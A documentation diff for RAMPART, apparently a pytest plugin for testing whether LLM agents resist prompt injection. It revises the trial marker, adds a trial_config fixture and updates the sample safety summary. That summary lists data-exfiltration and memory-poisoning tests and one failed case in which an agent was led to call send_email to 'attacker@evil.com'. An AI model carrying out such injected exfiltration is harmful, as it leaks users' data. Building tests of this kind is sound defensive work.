@@ -41,35 +41,47 @@ Built-in categories:
 
 ### `@pytest.mark.trial(n=, threshold=)`
 
-Run a test multiple times for statistical confidence. Each trial is an independent execution with a fresh session.
+Declare the intended population size and correctness threshold for a test. The marker remains selectable with `pytest -m trial`, but does not repeat or clone the test.
 
 **Why use it:** LLM-based agents are non-deterministic — the same prompt can produce different behavior across runs. A single test execution may not be representative. Trials address this by running the same test `n` times independently and reporting aggregate statistics. The `threshold` parameter lets you set an acceptable pass rate, acknowledging that 100% consistency may be unrealistic while still catching regressions. For example, `threshold=0.8` means "this test should pass at least 80% of the time" — if your agent suddenly drops below that, something changed.
 
 ```python
-@pytest.mark.trial(n=10)
-async def test_injection_resistance(adapter):
-    ...
+from rampart import Probes, execute_trials_async
 
 @pytest.mark.trial(n=10, threshold=0.8)
-async def test_with_threshold(adapter):
-    ...
+async def test_with_threshold(adapter, trial_config):
+    population = await execute_trials_async(
+        execution_factory=lambda: Probes.behavior(...),
+        adapter=adapter,
+        n=trial_config.n,
+        threshold=trial_config.threshold,
+    )
+    assert population, population.summary
 ```
 
 | Parameter | Type | Default | Description |
 |-----------|------|---------|-------------|
-| `n` | `int` | required | Number of trial repetitions |
+| `n` | `int` | `1` | Intended number of executions |
 | `threshold` | `float` | `1.0` | Minimum fraction of trials that must be SAFE to pass |
 
-**Trial semantics:**
+Use `--rampart-trials=N` to override only `trial_config.n`. The threshold remains the test's declared correctness bar. Class-level markers are inherited; a method-level marker shadows the class marker completely.
 
-- Each trial clone runs independently as a separate pytest item
-- Any `UNSAFE` result in any trial → the group **fails**
-- `threshold` sets the minimum pass rate: `threshold=0.8` requires ≥ 80% SAFE
-- `ERROR` results count against the pass rate (they are not `SAFE`)
-- The trial group aggregate appears in the terminal summary
+---
 
-!!! tip "Running trials in parallel"
-    Under [`pytest-xdist`](xdist.md), aggregation is correct under any `--dist` mode. The default `--dist=load` spreads trial clones across all workers and is usually fastest; use `--dist=loadgroup` only when a trial group must stay on one worker (shared session fixture or per-group worker state). See [Choosing `loadgroup` vs `load`](xdist.md#choosing-loadgroup-vs-load).
+## Fixtures
+
+### `trial_config`
+
+Available to tests marked with `@pytest.mark.trial`. It returns an immutable [`TrialConfig`][rampart.pytest_plugin.TrialConfig] containing the effective `n` and declared `threshold`. Requesting it from an unmarked test is an error.
+
+```python
+from rampart.pytest_plugin import TrialConfig
+
+@pytest.mark.trial(n=5, threshold=0.8)
+def test_population(trial_config: TrialConfig):
+    assert trial_config.n == 5
+    assert trial_config.threshold == 0.8
+```
 
 ---
 
@@ -137,13 +149,11 @@ After standard pytest output, RAMPART prints a safety summary grouped by harm ca
 ```
 ========================= RAMPART Safety Summary =========================
 
-DATA_EXFILTRATION (4 tests)
-  FAIL  test_xpia_email_exfil[trial-0] -- Attack objective detected: send_email({'recipient': 'attacker@evil.com'}) (tool_only)
-  PASS  test_xpia_email_exfil[trial-1] -- Agent defended successfully (tool_only)
-  PASS  test_xpia_search_exfil[trial-0] -- Agent defended successfully (tool_only)
-  PASS  test_xpia_search_exfil[trial-1] -- Agent defended successfully (tool_only)
-  PASS  test_xpia_email_exfil [1/2 safe, 50% pass rate, threshold: 80%] -- FAILED
-  PASS  test_xpia_search_exfil [2/2 safe, 100% pass rate, threshold: 80%] -- PASSED
+DATA_EXFILTRATION (4 results)
+    FAIL  test_xpia_email_exfil -- Attack objective detected: send_email({'recipient': 'attacker@evil.com'}) (tool_only)
+    PASS  test_xpia_email_exfil -- Agent defended successfully (tool_only)
+    PASS  test_xpia_search_exfil -- Agent defended successfully (tool_only)
+    PASS  test_xpia_search_exfil -- Agent defended successfully (tool_only)
 
 MEMORY_POISONING (1 tests)
   PASS  test_memory_poison -- Agent defended successfully (tool_only)
@@ -155,11 +165,9 @@ Population: 5 runs - 1 unsafe (20.0% attack success rate), 0 undetermined, 0 err
 Each result line shows:
 
 - **`PASS`/`FAIL`/`WARN`/`ERR`** — the safety verdict
-- **Test name** — with `[trial-N]` suffix for trial clones
+- **Test name** — the pytest test that recorded the result
 - **Summary** — e.g., `Agent defended successfully` or `Attack objective detected: ...`
 - **Observability level** — `tool_only`, `tool_and_side_effects`, or `response_only`
-
-Trial group lines show aggregate stats: safe count, pass rate, threshold, and overall verdict.
 
 The **Population** line shows totals across all tests in the session, with the attack success rate excluding `ERROR` results from the denominator.
 
